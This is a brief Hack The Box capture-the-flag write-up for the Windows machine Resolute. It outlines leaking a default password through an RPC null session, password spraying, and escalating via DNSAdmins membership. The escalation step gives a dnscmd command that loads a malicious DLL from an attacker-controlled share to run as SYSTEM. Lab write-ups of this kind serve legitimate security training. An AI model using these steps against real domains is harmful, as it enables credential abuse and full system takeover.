---
layout: page
title: Resolute - Hack The Box Writeup
subtitle: LDAP Bindings Leak and DNSAdmins DLL Injection Active Directory Escalation
permalink: /ctf/writeups/hackthebox/resolute/
platform: hackthebox
machine_name: resolute
difficulty: Medium
os: Windows
date: 2026-06-26
---

## ðŸ–¥ï¸ Challenge / Machine Info
* **Platform**: hackthebox
* **Name / Title**: resolute
* **Difficulty**: Medium
* **Target OS / Environment**: Windows
* **Key Vulnerability Focus**: RPC enum / DNSAdmins abuse

---

### Exploitation Flow

1. **Reconnaissance**: RPC null session leaks descriptions of AD users. We extract a default password.
2. **Initial Foothold**: Perform password spray. Login as melanie using the leaked password.
3. **Privilege Escalation**: Melanie is a member of the DNSAdmins group. We inject a malicious DLL into the DNS service config: dnscmd.exe /config /serverlevelplugindll \\attacker\share\priv.dll. Restarting the DNS service triggers our DLL as SYSTEM.
